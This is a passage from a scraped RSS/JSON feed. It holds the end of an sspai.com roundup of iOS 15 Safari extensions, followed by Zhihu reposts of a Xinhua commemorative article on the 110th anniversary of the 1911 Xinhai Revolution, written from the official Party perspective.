figcaption=\"将食谱中的食材添加到应用\"><img src=\"https://cdn.sspai.com/2021/10/02/241210b74348c31fd1d5c1339d119f5a.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/f10ac139a1b8f9a1c8ca1452350afb61.PNG\" alt=\"\"></figure><p>尽管 Bring! 应用本身暂时没有提供中文页面，但并不影响其 Safari 插件对中文食谱的识别。不过要完成应用内默认的全部食材的中文版本替换可能会需要花费一定精力。如果你需要这样一款 App，可以在 <a href=\"https://apps.apple.com/cn/app/bring-%E8%B4%AD%E7%89%A9%E6%B8%85%E5%8D%95%E5%92%8C%E9%A3%9F%E8%B0%B1/id580669177\">App Store</a> 中免费下载。</p>\n<span class=\"ss-application\" app-id=\"16218\"> </span><h2>视频控制</h2>\n<h3>PiPifier</h3>\n<p>PiPifier 是一款可以为视频网站开启画中画的插件。实际上，PiPifier 并不是一款新应用。早在 2017 年，少数派就曾 <a href=\"https://sspai.com/post/39522\">介绍</a> 过 PiPifier 在 iPad 上的应用。遗憾的是，尽管时间已经过去四年，依然有很多网站（包括不少主流视频网站）并不自带对画中画功能的支持。而在新版 Safari 浏览器扩展的支持下，PiPifier 的使用也变得更为方便。</p>\n<p>在下载并开启扩展后，你可以在任意以 HTML5 格式播放视频的网站页面，点击地址栏左侧的扩展图标后，在打开的菜单中点击 PiPifier 应用图标，当前视频就会进入画中画模式。</p>\n<figure class=\"ss-imgRows\" figcaption=\"PiPifier 的开启效果\"><img src=\"https://cdn.sspai.com/2021/10/02/9fc605d743e645004c830585dd3f260d.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/c9a6ca787f04c5e0b11cbb0e7ab44e22.PNG\" alt=\"\"></figure><p>你可以在 App Store 免费下载 <a href=\"https://apps.apple.com/cn/app/pipifier/id1234771095\">PiPifier</a>。应用无内购解锁功能，但你可以选择花 6 元或 12 元捐助开发者。</p>\n<span class=\"ss-application\" app-id=\"16219\"> </span><h3>Vidimote</h3>\n<p>相较于只提供了画中画模式的 PiPifier，Vidimote 的功能更为全面。和 PiPifier 的使用方法类似，在开启扩展后，只需在 Safari 浏览器的扩展栏点击应用图标，就可以进入 Vidimote 的控制页面。除了选择开启画中画模式，Vidimote 的控制页面还提供了进度条，前进、后退，播放速度等选项，从而更便捷地掌控视频的播放。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/02/230dd21d9bec5dcc030eaf93a0bde558.jpg\"></figure><p>你可以在 <a href=\"https://apps.apple.com/cn/app/vidimote-for-safari/id1585702412\">App Store</a> 下载 Vidimote，应用售价 30 元，无内购。</p>\n<span class=\"ss-application\" app-id=\"16220\"> </span><h2>页面美化</h2>\n<h3>PrettyWeb</h3>\n<p>PrettyWeb 是一款多功能的 Safari 浏览器优化扩展。除了为网页提供暗色模式、屏蔽广告外，PrettyWeb 还可以让用户自定义 Safari 浏览器的启动页面。</p>\n<p>在开启该功能后，Safari 浏览器的新标签页会被精简为一个搜索框和背景。你可以在 PrettyWeb 内对背景进行设置，并为搜索框选择默认的搜索引擎。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/a7b25e2e2218c4f79fa39d9c9b0400bc.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/033f863f74e2e267e807f60eba595404.PNG\" alt=\"\"></figure><p>你可以在 <a href=\"https://apps.apple.com/cn/app/prettyweb/id1580269767\">App Store</a> 免费下载 PrettyWeb，部分功能需要内购解锁。</p>\n<span class=\"ss-application\" app-id=\"16221\"> </span><h3>StartPage.ai</h3>\n<p>StartPage.ai 在开启后，会在 Safari 浏览器的新标签页页面显示最近打开的页面。你可以点击条目跳转，或是快捷地将其关闭。如果你也没有定期清理 Safari 浏览器已打开标签页的习惯，StartPage.ai 可能是一个不错的选择。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/10/02/0421f0f73590b2dce813e8a291b844f8.PNG\"><figcaption>StartPage.ai 的开启效果</figcaption></figure><p><a href=\"https://apps.apple.com/cn/app/startpage-ai/id1584727895\">‎</a>你可以在 <a href=\"https://apps.apple.com/cn/app/startpage-ai/id1584727895\">App Store</a> 免费下载 StartPage.ai，应用无内购。</p>\n<span class=\"ss-application\" app-id=\"16222\"> </span><h3>Refined GitHub</h3>\n<p>Refined GitHub 此前是一款开源的桌面端插件。随着 iOS 15 的发布，开发者也适时推出了 iOS 和 iPadOS 版本。</p>\n<p>针对 GitHub 页面存在的一些不尽如人意的方面，Refined GitHub 给出了颇多的改进。在 Safari 浏览器中点击扩展图标后，Refined GitHub 的设置页面提供了 213 项功能供用户选择。你可以根据自己的需要和使用习惯来选择是否开启部分功能。实际体验下来，Refined GitHub 提供的了一些相当实用的改进。</p>\n<p>例如，在开启「show-whitespace」后，GitHub 在显示代码时，会为空格和 tab 等添加标记；当 merge 发生版本冲突时，「resolve-conflicts」可以让你一键选择如何处理冲突代码；「linkify-code」会自动识别代码注释中的 URL 和 PR 链接，并将其设置为超链接；「conversation-activity-filter」会在 PR 页面提供选项，让你可以只查看未解决的 comment。你可以在应用的 <a href=\"https://github.com/sindresorhus/refined-github\">GitHub</a> 页面查看 Refined GitHub 的更多功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/02/ed48b00b8061b09684aa7f2a7c1e5922.png\"><figcaption>「show-whitespace」功能</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/02/2fc80852b74ec20a0ff47874798bbb24.png\"><figcaption>「resolve-conflicts」功能</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/02/98323107ca7d5dee77d21bc1f4ff5faf.png\"><figcaption>「linkify-code」功能</figcaption></figure><p>综合来看，Refined GitHub 可以很好地提高 iOS 设备在 GitHub 页面的体验，在 iPadOS 上更是格外实用。你可以在 <a href=\"https://apps.apple.com/cn/app/refined-github/id1519867270\">App Store</a> 上免费下载 Refined GitHub，应用无内购。</p>\n<span class=\"ss-application\" app-id=\"16223\"> </span><h2>其他工具</h2>\n<h3>Svadilfari</h3>\n<p>少数派曾详细 <a href=\"https://sspai.com/post/43369\">介绍</a> 过 macOS 平台上的触控板增强应用 BetterTouchTool。而现在，你可以借助 Svadilfari 在 iOS 的 Safari 浏览器中实现类似的功能。</p>\n<p>iOS 15 为 Safari 浏览器引入了新的标签页交互手势：左右滑动地址栏来快速切换标签页；在最新的标签页地址栏左滑来新建标签页；将页面滑至顶部后下拉来刷新页面。而 Svadilfari 则进一步提供了关闭标签页、复制当前页面网址、快速跳转至页面顶部或底部等功能。你只需在应用中创建一个手势后，为其选择对应的功能即可。更为进阶的用户还可以通过 JavaScript 进一步拓展 Svadilfari 的功能。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：两种手势添加方式；右：可以选择的功能\"><img src=\"https://cdn.sspai.com/2021/10/02/073846b10770b8cfb2391b21ed8862e2.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/10/02/0ee63a3cec90decb86f1a239a22d056d.jpeg\" alt=\"\"></figure><p>在实际测试中，Svadilfari 有着不错的识别准确率和较为灵敏的反应速度，足以满足日常使用。你可以在 <a href=\"https://apps.apple.com/cn/app/svadilfari/id1586432379\">App Store</a> 中免费下载 Svadilfari，应用无内购。</p>\n<span class=\"ss-application\" app-id=\"16224\"> </span><h3>HyperWeb</h3>\n<p>上文中介绍的扩展大多专注于某一种功能，而 HyperWeb 则是名副其实的大杂烩，致力于提供「All in One」的体验。</p>\n<p>HyperWeb 的「Popular」页面提供了广告和 Cookies 拦截、暗色模式、更改搜索引擎等功能。你还可以自定义网页外观，或是针对特定的搜索类型（如新闻、购物等）限定显示的网站范围。</p>\n<p>而在「Suggested」中，HyperWeb 则有着更为丰富的可选功能。不论是搜索、购物、视频下载、查看网站的历史页面，还是针对特定内容的搜索针对性地显示部分网站的内容，HyperWeb 都有对应的功能可供选择。</p>\n<p>如果以上内容都不满足要求，你还可以在「Local」页面，用类似设置快捷指令的方式，自行创建新的自动化内容。</p>\n<p>你可以在 <a href=\"https://apps.apple.com/cn/app/hyperweb/id1581824571\">App Store</a> 免费下载 HyperWeb。</p>\n<span class=\"ss-application\" app-id=\"16225\"> </span><h2>小结</h2>\n<p>相较于 Chrome 的网上应用店，macOS 中的 Safari 浏览器扩展一直处于不温不火的状态。本次 iOS 更新后，虽然 App Store 中的 Safari 浏览器扩展目前数量有限且良莠不齐，但凭借 iOS 更为庞大的用户群体和应用数量，可以预想到，未来的 iOS App Store 中一定会出现更多、更优秀的 Safari 浏览器扩展应用。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/69086"},{"title":"今年是辛亥革命 110 周年，回望 1911 年，哪些事对推动中国社会变革意义重大？","date":"2021-10-09 02:53:31","description":"\n<p>为知友们补充更多信息：</p>\n<p><b>为实现民族复兴接续奋斗——写在辛亥革命110周年之际  </b></p>\n<p>　　历史，往往在经过时间沉淀后可以看得更加清晰。</p>\n<p>　　“亟拯斯民于水火，切扶大厦之将倾”。110年前爆发的辛亥革命，以其惊心动魄的时代伟力，打开了中国进步闸门，为中华民族发展进步探索了道路，成为民族复兴伟大征程上一座巍然屹立的里程碑。</p>\n<p>　　一百余年岁月山河，沧桑巨变换了人间。</p>\n<p>　　今天的中国，在以习近平同志为核心的党中央坚强领导下，经过全党全国各族人民持续奋斗，已实现第一个百年奋斗目标，在中华大地上全面建成了小康社会，历史性地解决了绝对贫困问题，正在意气风发向着全面建成社会主义现代化强国的第二个百年奋斗目标迈进。海内外中华儿女，正把握历史机遇，担当历史责任，为实现中华民族伟大复兴的中国梦接续奋斗。</p>\n<p><b>大潮起，摧枯拉朽</b></p>\n<p>　　正逢秋日，英雄城市武汉风景如画。大街小巷，散发着或繁忙或从容的气质。</p>\n<p>　　徜徉在城市，细看街名，中山路、三民路、首义路、起义街、民权路……历史的烟云，已化作这座城市不可磨灭的印记。</p>\n<p>　　也是一个秋日。1911年10月10日。</p>\n<p>　　清脆的枪声，划破了武昌城的天空。</p>\n<p>　　那一刻的人们也许没有想到，这一湖北新军工程第八营发出的枪响，会埋葬中国两千多年的君主专制制度，为未来中国一百多年的波澜壮阔写下第一笔——</p>\n<p>　　一夜激战，革命军占领武昌全城；</p>\n<p>　　随后，全国各省纷纷响应；</p>\n<p>　　1912年第一天，中华民国成立，亚洲地区第一个民主共和国诞生；</p>\n<p>　　1912年2月12日，清帝退位，曾不可一世的至高皇权，就此轰塌。</p>\n<p>　　风卷残云，摧枯拉朽。</p>\n<p>　　由武昌城震惊世界的枪响回溯，穿越半个多世纪的时光，能听到鸦片战争英国舰队轰击中国海岸线的隆隆炮声。“天朝上国”封闭停滞，被远远甩在“百年锐于千载”的工业革命浪潮后面。此后，中国陷入内忧外患的黑暗境地，中国人民经历了山河破碎、民不聊生的深重苦难。</p>\n<p>　　中国往何处去？</p>\n<p>　　热爱祖国的仁人志士为这个问题苦苦求索。</p>\n<p>　　太平天国的悲歌，洋务运动的夭折，戊戌变法的幻灭，清末新政的破产……无怪乎谭嗣同悲叹：“世间无物抵春愁，合向苍冥一哭休。四万万人齐下泪，天涯何处是神州？”</p>\n<p>　　诸多的失败，证明了这样一种必然：“公理之未明，即以革命明之。旧俗之俱在，即以革命去之”。</p>\n<p>　　正是在这样的历史大潮中，资产阶级革命派登上了历史舞台。</p>\n<p>　　孙中山先生是伟大的民族英雄、伟大的爱国主义者、中国民主革命的伟大先驱。他高扬反对封建专制统治的旗帜，毅然投身民主革命事业，创立兴中会、同盟会，提出民族、民权、民生的三民主义，积极传播革命思想，广泛联合革命力量，连续发动武装起义，为推进民主革命四处奔走、大声疾呼。</p>\n<p>　　在革命的旗帜下，中华民族的觉醒者们，以生命、青春与热血，“肩住了黑暗的闸门”，开启了“亚洲的觉醒”。</p>\n<p>　　——安庆起义失败后，“光复军”首领徐锡麟在公堂上大义凛然，直言“尔等杀我好了，将我心剖了，两手两足断了，全身碎了，均可，不可冤杀学生”。</p>\n<p>　　——起义失败被捕后，巾帼英雄秋瑾坚贞不屈，写下“秋风秋雨愁煞人”的绝命诗，从容就义。</p>\n<p>　　——黄花岗七十二烈士之一的林觉民，在给妻子的诀别信中写下“亦以天下人为念，当亦乐牺牲吾身与汝身之福利，为天下人谋永福也”的豪迈话语，慷慨赴死。</p>\n<p>　　……</p>\n<p>　　革命，革命！醒来，醒来！</p>\n<p>　　革命的干柴，早已在全国范围内铺就。武昌城头的那声枪响，最终点燃了辛亥革命的熊熊烈火。</p>\n<p>　　辛亥革命的烈火，推翻了清王朝统治，结束了统治中国几千年的君主专制制度。但由于历史进程和社会条件的制约，辛亥革命没有改变旧中国半殖民地半封建的社会性质，没有改变中国人民的悲惨命运，没有完成实现民族独立、人民解放的历史任务。</p>\n<p>　　即便如此，正如列宁所指出的，判断历史的功绩，不是根据历史活动家没有提供现代所要求的东西，而是根据他们比他们的前辈提供了新的东西。</p>\n<p>　　在中国社会科学院学部委员张海鹏看来，辛亥革命的精神之魂是爱国主义精神。当年，正是因为国家的积贫积弱、民族的危难多舛、人民的困顿疾苦，有志之士才要用革命推翻清朝腐败统治，发出“救亡图存”的呐喊和“振兴中华”的吼声。也正是在爱国主义精神的激励下，中国共产党人承担起先辈们未完成的事业，接续奋斗，一个生机盎然的社会主义中国才能屹立在世界东方。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3e4f79f57676e712842ec0fa4fac5b78_720w.jpg?rss\" data-caption=\"长江三峡水利枢纽工程开启泄洪深孔泄洪（2020年8月19日摄，无人机照片）。新华社记者 肖艺九 摄\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"377\" data-watermark=\"watermark\" data-original-src=\"v2-3e4f79f57676e712842ec0fa4fac5b78\" data-watermark-src=\"v2-a2fcaadcab6549678ea167a34976afe3\" data-private-watermark-src=\"v2-4f0e9c84179fd9684d10dd396965d36d\"></p>\n<p>　 “新的历史条件下，我们纪念辛亥革命，就是要大力弘扬爱国主义精神，坚定不移沿着中国特色社会主义道路守护好、建设好我们伟大的国家。”张海鹏说。</p>\n<p><b>传薪火，使命在肩</b></p>\n<p>　　北京市西城区文华胡同24号，一座三合院古朴静谧，李大钊曾在此度过近四年时光。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e37015821bb765ac56fd9e50b5c6b463_720w.jpg?rss\" data-caption=\"北京李大钊故居的讲解员为前来参观的学生做介绍（6月1日摄）。新华社记者 张晨霖 摄\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"472\" data-watermark=\"watermark\" data-original-src=\"v2-e37015821bb765ac56fd9e50b5c6b463\" data-watermark-src=\"v2-90a168a18fba7ade6a7cb86a248c460f\" data-private-watermark-src=\"v2-8ca3e0faaa0b8bf8f2d3d808ed103c50\"></p>\n<p>   　“钊自束发受书，即矢志努力于民族解放之事业，实践其所信，励行其所知……”故居内，一场名为《播火者》的沉浸式话剧，娓娓道来李大钊“铁肩担道义，妙手著文章”的一生。</p>\n<p>　　透过历史的烟尘，时间拨回到民国初年。李大钊曾对革命成果——建立共和制度欢欣鼓舞。然而，革命果实很快落到以袁世凯为首的北洋军阀手中。十分关心国家命运的李大钊，这时已敏锐地感受到新的共和制度存在着“隐忧”。1913年，他以愤怒而沉痛的心情尖锐地指出：“共和自共和，幸福何有于吾民也！”</p>\n<p>　　尽管皇帝退位，但各地军阀依然争战不休；头上的辫子虽剪，“脑中的辫子”犹存；亚洲第一个民主共和国的光环，难掩惨遭列强欺凌瓜分的悲惨境遇……</p>\n<p>　　苦苦寻求救亡图存、强国富民之路的先进分子在探寻中发问：中国的出路在哪里？民族的希望在哪里？</p>\n<p>　　十月革命一声炮响，给中国送来了马克思列宁主义，犹如一道刺破暗夜的闪电，给苦难深重的旧中国带来希望。一年多后，五四运动劈开旧中国如磐铁幕，唤醒暗夜中沉睡的灵魂，促进了马克思主义在中国的广泛传播。</p>\n<p>　　在激辩中传播，于比较中选择。</p>\n<p>　　董必武、林伯渠、吴玉章等一些老同盟会会员、辛亥革命时期的活动家，李大钊、毛泽东等深受辛亥革命影响的革命者，纷纷把目光投向了马克思主义，逐步转变为共产主义者。</p>\n<p>　　1921年7月23日，大暑，上海空气濡湿闷热。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5c9492027d689313d82fd826713a3707_720w.jpg?rss\" data-caption=\"观众排队进入中共一大纪念馆参观（6月12日摄）。新华社记者 丁汀 摄\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"453\" data-watermark=\"watermark\" data-original-src=\"v2-5c9492027d689313d82fd826713a3707\" data-watermark-src=\"v2-9bfedbefdbb849a9eaf5b41dbf7103b4\" data-private-watermark-src=\"v2-b62e1e29c624c6e07245f173cb3c4a20\"></p>\n<p>       望志路106号，一幢不起眼的石库门小楼里，亮起星点灯光，中共一大在这里召开。从此，中国共产党人登上历史舞台。</p>\n<p>　　为什么共和制度在中国社会步履维艰？其中的一个重要原因是辛亥革命没有深入发动蕴藏在人民群众中的革命伟力。只有唤起亿万民众的觉醒，方能改变中华民族的命运走向。</p>\n<p>　　认识到这一点，以毛泽东为代表的共产党人承担起辛亥革命未能完成的历史使命，致力于“唤起工农千百万，同心干”，开创出农村包围城市、武装夺取政权的革命道路。</p>\n<p>　　从土地革命战争、抗日战争、解放战争中一路走来，中国共产党人在对辛亥革命精神的继承中实现超越和升华，带领广大人民夺取了新民主主义革命的胜利，完成了近代以来无数仁人志士梦寐以求的民族独立、人民解放。</p>\n<p>　　这一刻，近代以来历经苦难斗争的中国人民，迎来中华民族浴火重生的曙光——</p>\n<p>　　“中华人民共和国中央人民政府今天成立了！”</p>\n<p>　　1949年10月1日下午3时，毛泽东主席用激昂的语调，向全世界庄严宣告。震天的欢呼激荡在天安门广场。</p>\n<p>　　身着深色旗袍的宋庆龄站在城楼上，看着眼前涌动的人潮，看着广场上矗立的孙中山先生画像，不禁热泪盈眶。８天后，她这样向世人讲述在天安门城楼的那一刻——</p>\n<p>　　“连年的伟大奋斗和艰苦的事迹，又在我眼前出现。但是另一个念头抓住我的心，我知道，这一次不会再回头了，不会再倒退了。这一次，孙中山的努力终于结了果实，而且这果实显得这样美丽……”</p>\n<p>　　事实胜于雄辩。中国共产党团结带领中国人民，始终奋力践行为中国人民谋幸福、为中华民族谋复兴的初心使命——</p>\n<p>　　自力更生、发愤图强，创造了社会主义革命和建设的伟大成就，为实现中华民族伟大复兴奠定了根本政治前提和制度基础。</p>\n<p>　　解放思想、锐意进取，创造了改革开放和社会主义现代化建设的伟大成就，为实现中华民族伟大复兴提供了充满新的活力的体制保证和快速发展的物质条件。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5afdcbeb72410c589e97044febbf26eb_720w.jpg?rss\" data-caption=\"2020年7月15日拍摄的江西省井冈山市神山村村民笑脸合集（拼版照片）。新华社记者 彭昭之 摄\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"433\" data-watermark=\"watermark\" data-original-src=\"v2-5afdcbeb72410c589e97044febbf26eb\" data-watermark-src=\"v2-e03e634e89214b2f86fcfc8dbd9605ef\" data-private-watermark-src=\"v2-e0117fdba98cf4816e8cc7a57b8c12b1\"></p>\n<p>      党的十八大以来，在以习近平同志为核心的党中央坚强领导下，中国共产党团结带领中国人民，自信自强、守正创新，统揽伟大斗争、伟大工程、伟大事业、伟大梦想，创造了新时代中国特色社会主义的伟大成就，为实现中华民族伟大复兴提供了更为完善的制度保证、更为坚实的物质基础、更为主动的精神力量，中华民族迎来了从站起来、富起来到强起来的伟大飞跃，实现中华民族伟大复兴进入了不可逆转的历史进程。</p>\n<p><b>同奋进，迈向复兴</b></p>\n<p>　　珠江口西岸，广东省中山市翠亨新区，孙中山先生故乡。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bfd32ed80ed8931e1c88f018cb6e95c2_720w.jpg?rss\" data-caption=\"由中交二航局承建的深中通道伶仃洋大桥东索塔（7月1日摄）。新华社记者 刘大伟 摄\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"393\" data-watermark=\"watermark\" data-original-src=\"v2-bfd32ed80ed8931e1c88f018cb6e95c2\" data-watermark-src=\"v2-8155abc15c5ff2a2e18fd17d3568283e\" data-private-watermark-src=\"v2-39bebc9b51ad5299b67bcc13779fbe65\"></p>\n<p>        如今，深中通道伶仃洋大桥东、西主塔已封顶。到2024年，全长24公里的深中通道正式通车后，从深圳到中山的车程仅需20分钟。</p>\n<p>　　拉近的，不仅是路程。“敢为天下先”的精神力量，延绵广远。</p>\n<p>　　“振兴中华”！1894年，孙中山先生在《兴中会章程》中，首次喊出时代的最强音。</p>\n<p>　　百余年前，这位伟大的民主革命先行者，又在《建国方略》中，构想了一幅幅宏伟蓝图。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-96632852aa391a1ea42abd4391224558_720w.jpg?rss\" data-caption=\"动车组停靠在武汉动车段的存车线上，准备进行检修和保温作业（2018年2月1日摄）。新华社记者 肖艺九 摄\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"426\" data-watermark=\"watermark\" data-original-src=\"v2-96632852aa391a1ea42abd4391224558\" data-watermark-src=\"v2-46b4bb867e46474c0f37ec9455e1de0a\" data-private-watermark-src=\"v2-0a5bcfbbec07fa547d76da9d19788122\"></p>\n<p>       当年，澳大利亚人威廉·端纳面对孙中山先生拿出的画满铁路线的中国地图摇头说：“这个如同游戏拼图一样的东西根本没有实现的可能。”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e6d093e66b69e8754ae4c1c425d944b9_720w.jpg?rss\" data-caption=\"车辆行驶在秀印高速公路木黄至梵净山路段（8月15日摄，无人机照片）。新华社记者 陶亮 摄\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"359\" data-watermark=\"watermark\" data-original-src=\"v2-e6d093e66b69e8754ae4c1c425d944b9\" data-watermark-src=\"v2-1a7aca142567d481cd4145624db72ba1\" data-private-watermark-src=\"v2-d3e4d36ac85b5dacb2e2e67f9132184e\"></p>\n<p>　  “‘振兴中华’的理想在近代中国国运衰微、制度腐败、战乱不已的情况下，难以实现。只有在中国共产党领导下，才能找到实现民族复兴的正确道路。”中国史学会会长李捷表示。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4093f6b53ad5a8c2a8bcd755c2bcdaef_720w.jpg?rss\" data-caption=\"试运行的复兴号列车行驶在西藏山南市境内（6月16日摄）。新华社记者 觉果 摄\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"403\" data-watermark=\"watermark\" data-original-src=\"v2-4093f6b53ad5a8c2a8bcd755c2bcdaef\" data-watermark-src=\"v2-a521a97689d85dfa58b07297ae0cd1f1\" data-private-watermark-src=\"v2-8bd0c296951adb1dbbe804ade182e973\"></p>\n<p>　　“我们走遍大江南北，看着国家的生机勃勃，今天的铁路、公路、港口、水利、电力以及航天工业的建设成就已远超孙中山先生当年的想象。”孙中山先生曾侄孙孙必达很自豪。</p>\n<p>　　国家强大、人民幸福，是辛亥革命者们的梦想</p>\n<p>　　西邻黄鹤楼，北倚蛇山，南面首义广场。位于武汉的辛亥革命武昌起义纪念馆，曾是中华民国军政府鄂军都督府，如今，已成为人民群众了解辛亥革命历史的一座地标。</p>\n<p>　　9月30日，为纪念首义精神而举办的“辛亥首义人物图片史料展”在纪念馆隆重举行。展馆内，一幅孙中山先生手书的“天下为公”横幅，吸引不少参观者驻足。</p>\n<p>　　孙中山先生一生坚持以“天下为公”为最高思想境界，致力于“除去人民的那些忧愁，替人民谋幸福”，带领革命者们为此目标矢志不移。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c335ba0a21cd9710bcf4ef6281958626_720w.jpg?rss\" data-caption=\"位于湖北省武汉市武昌区的辛亥革命博物馆（10月5日摄，无人机照片）。新华社发（伍志尊摄）\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"426\" data-watermark=\"watermark\" data-original-src=\"v2-c335ba0a21cd9710bcf4ef6281958626\" data-watermark-src=\"v2-d4353e806f940d05ae3e7593f2747ba7\" data-private-watermark-src=\"v2-26c82b08f942f70e6a0d10e28f067886\"></p>\n<p>       如今，中国人民历史性地解决了绝对贫困问题，再无饥馑之年、冻馁之患，迈上了全面小康、共同富裕的康庄大道。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-69812d8b33a298a870b3921677133bce_720w.jpg?rss\" data-caption=\"一艘轮船靠泊在唐山港京唐港区集装箱码头装货（4月8日摄，无人机照片）。新华社记者 杨世尧 摄\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"430\" data-watermark=\"watermark\" data-original-src=\"v2-69812d8b33a298a870b3921677133bce\" data-watermark-src=\"v2-26ce71acd71350e25b265735224601fd\" data-private-watermark-src=\"v2-cd5cd0f8615544383b5f5a9085a1c172\"></p>\n<p>        “在中国共产党领导下，我们的国家繁荣富强。作为一名共产党员，也是一名辛亥革命志士的后裔，我非常自豪，相信这一定也是我们的先辈所期望的。”打响武昌起义第一枪的熊秉坤的长孙熊永铸激动地说。</p>\n<p>　　团结统一的中华民族是海内外中华儿女共同的根，实现中华民族伟大复兴的中国梦是海内外中华儿女共同的梦。</p>\n<p>　　近日，在北京的一处住宅里，黄埔军校同学会会长、抗战老兵林上元及他的儿子、香港黄埔军校后代亲友联谊会会长林际平接受了记者的采访。</p>\n<p>　　尽管林上元老人已97岁高龄，林际平也已年近古稀，但父子俩一直以黄埔精神为纽带，团结海内外黄埔同学和他们的后人，为推动两岸关系和平发展、推进祖国和平统一进程而奔走。</p>\n<p>　　“我的外曾祖父是参加过武昌首义的辛亥革命元老张难先，国破山河碎的悲痛历史，已深深刻入他们的骨髓，中国是一个统一的国家，已牢牢印在他们的意识中。我们所做的，就是传承他们的精神，为国家的统一作贡献。”林际平很坚定。</p>\n<p>　　实现祖国完全统一，是中华民族根本利益所在，也是全体中华儿女的共同愿望和神圣职责。确保国家完整不被分裂，维护中华民族根本利益，是全体中华儿女共同意志，是不可阻挡的历史潮流。</p>\n<p>　　“站在‘两个一百年’奋斗目标的历史交汇点上思考台湾问题，我们会清楚认识到，国家统一是新时代民族复兴的必然要求，解决台湾问题、实现祖国统一是中华民族伟大复兴的题中应有之义。”张海鹏说。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-abcc143d49f7b3f074d52ad00103f47f_720w.jpg?rss\" data-caption=\"在位于黑龙江省齐齐哈尔市的中国一重集团有限公司风电装备生产制造厂生产车间，工人在进行生产作业（7月1日摄）。新华社记者 王建威 摄\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"426\" data-watermark=\"watermark\" data-original-src=\"v2-abcc143d49f7b3f074d52ad00103f47f\" data-watermark-src=\"v2-6d71f907a3fcbcdffa74ec4dad43c2df\" data-private-watermark-src=\"v2-83a63eed198cf90a98c93233912f784a\"></p>\n<p>        无限的过去都以现在为归宿，无限的未来都以现在为渊源。</p>\n<p>　　三个多月前，在天安门广场，庆祝中国共产党成立100周年大会隆重举行，习近平总书记以铿锵有力的话语展望——</p>\n<p>　　“有中国共产党的坚强领导，有全国各族人民的紧密团结，全面建成社会主义现代化强国的目标一定能够实现，中华民族伟大复兴的中国梦一定能够实现！”（记者王琦、孙少龙、王子铭、任沁沁、廖君，参与记者喻珮、查文晔）</p>\n<blockquote>来源：新华社</blockquote>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/sou-hu-xin-wen-59?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">搜狐新闻</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/491200346/answer/2161459386?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">197 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/268190060?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待辛亥革命中孙中山屡战屡败？</a><br><a href=\"http://www.zhihu.com/question/30490004?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么孙中山领导的辛亥革命引起了近代中国的历史性巨大变化？</a><br>\n","link":"http://www.zhihu.com/question/491200346/answer/2161459386?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"今年是辛亥革命 110 周年，回望 1911 年，哪些事对推动中国社会变革意义重大？","date":"2021-10-09 02:52:25","description":"\n<p>武昌城的枪响，揭开了古老中国发展进步的新篇章，也为中国共产党的成立准备了客观社会条件。</p>\n<p>经历了辛亥风云的民主革命先行者们，点燃中国革命的赤焰，成为中华民族发展进步的“先声”。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xin-hua-she-3?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">新华社</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a 